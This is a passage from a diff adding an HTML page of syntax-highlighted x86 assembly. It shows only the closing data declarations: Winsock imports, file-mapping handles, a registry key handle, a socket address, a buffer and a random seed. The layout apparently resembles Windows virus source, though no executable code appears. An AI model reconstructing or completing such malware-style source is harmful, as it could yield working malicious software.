+</span><span class="sc5">connect</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">closesocket</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">recv</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">send</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">WSACleanup</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+
+        
+
+</span><span class="sc5">totalend</span><span class="sc4">:</span><span class="sc0">
+
+</span><span class="sc5">stackframe</span><span class="sc0">      </span><span class="sc9">struc</span><span class="sc0">
+
+</span><span class="sc5">createhandle</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">maphandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">viewhandle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">addie</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">48h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
+
+</span><span class="sc5">stackframe</span><span class="sc0">      </span><span class="sc9">ends</span><span class="sc0">
+
+
+
+</span><span class="sc5">stack2</span><span class="sc0">          </span><span class="sc9">struc</span><span class="sc0">
+
+</span><span class="sc5">regkeyhnd</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">sockaddr_in</span><span class="sc0">     </span><span class="sc5">ssockaddr_in</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">300h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">rnd32seed</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc1">;space           WSADATA ?</span><span class="sc0">
+</span><span class="sc9">ends</span><span class="sc0">
+
+        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">
+        </span><span class="sc9">end</span><span class="sc0">
+
+
+</span></div></body>
+</html>
